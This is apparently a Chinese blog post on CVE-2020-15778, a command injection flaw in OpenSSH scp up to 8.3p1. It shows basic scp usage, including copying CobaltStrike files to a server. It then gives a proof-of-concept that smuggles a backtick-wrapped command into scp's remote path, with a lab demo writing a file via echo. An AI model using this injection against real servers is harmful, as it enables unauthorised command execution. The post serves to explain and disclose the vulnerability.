# （CVE-2020-15778）Openssh 命令注入漏洞 - 追得上的梦想 - 博客园

> 原文：[`www.cnblogs.com/KHZ521/p/14639257.html`](https://www.cnblogs.com/KHZ521/p/14639257.html)

### 前言

2020 年 6 月 9 日，研究人员 Chinmay Pandya 在 Openssh 中发现了一个漏洞，于 7 月 18 日公开。OpenSSH 的 8.3p1 中的 scp 允许在 scp.c 远程功能中注入命令，攻击者可利用该漏洞执行任意命令。目前绝大多数 linux 系统受影响。深信服安全研究团队依据漏洞重要性和影响力进行评估，作出漏洞通告。

### 漏洞影响

```
OpenSSH =< 8.3p1 
```

### SCP 基础介绍

上传文件

```
scp C:\ST\CobaltStrike\CobaltStrike.exe root@123.56.150.172:/home/ 
```

上传文件夹

```
scp -r C:\ST\CobaltStrike root@123.56.150.172:/home/ 
```

下载文件

```
scp root@123.56.150.172:/home/CobaltStrike/CobaltStrike.jar C:\Users\17107\Desktop\ 
```

下载文件夹

```
scp -r root@123.56.150.172:/home/CobaltStrike/ C:\Users\17107\Desktop\ 
```

### 漏洞利用

POC

```
scp 1.txt root@<IP 地址>:'`<需要执行的命令>`/tmp/1.txt' 
```

1.查看版本是否存在漏洞

```
ssh -V 
```

![](img/b22797b794a52d77b23aefe45cddab19.png)
2.查看文件夹并不存在 1.txt 和 123.txt 文件
![](img/9e3fb7472e8e48887865fa8b7630dac2.png)
3.执行 EXP 尝试注入 echo 命令并写入 123.txt 文件
`scp 1.txt root@192.168.245.128:'`echo 123>/tmp/123.txt`/tmp/1.txt'`
![](img/bf47b471ea4db7a959c73f6cc2746cc1.png)
4.查看文件结果，scp 和 echo 同时执行成功
![](img/3fd5f4656079d3fe2fec03a191d54b8d.png)